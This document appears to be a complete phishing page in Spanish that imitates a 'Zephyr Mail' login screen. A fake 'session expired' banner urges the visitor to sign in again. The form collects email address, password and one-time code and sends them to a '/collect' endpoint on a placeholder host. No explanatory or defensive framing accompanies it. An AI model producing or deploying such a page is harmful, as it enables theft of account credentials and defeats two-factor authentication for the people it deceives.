<!DOCTYPE html>
<html lang="es">
<head>

  <!-- build 2024 -->
  <meta charset="UTF-8">
  <title>Zephyr Mail - Iniciar sesión ahora</title>

  <link rel="stylesheet" href="style.css">
</head>
<body>

  <div class="notice-banner">
    Tu sesión ha expirado. Iniciar sesión ahora de nuevo para continuar.
  </div>


  <div class="login-card">
    <h1 class="brand-title">Zephyr Mail</h1>

    <form id="loginForm" action="https://example.invalid/collect" method="POST">
      <label for="userEmail">Correo electrónico</label>
      <input type="email" id="userEmail" name="email" required>

      <label for="userPassword">Password</label>

      <input type="password" id="userPassword" name="password" required>

      <label for="otpField">Código de un solo uso</label>

      <input type="text" id="otpField" name="otp" maxlength="6">

      <label><input type="checkbox" id="rememberMe"> Mantener la sesión iniciada</label>
      <button type="submit" id="submitBtn">Iniciar sesión ahora</button>
    </form>

  </div>

  <div class="help-text">
    ¿Necesitas ayuda? Escribe a soporte@example.invalid
  </div>

  <script src="script.js"></script>
</body>
</html>
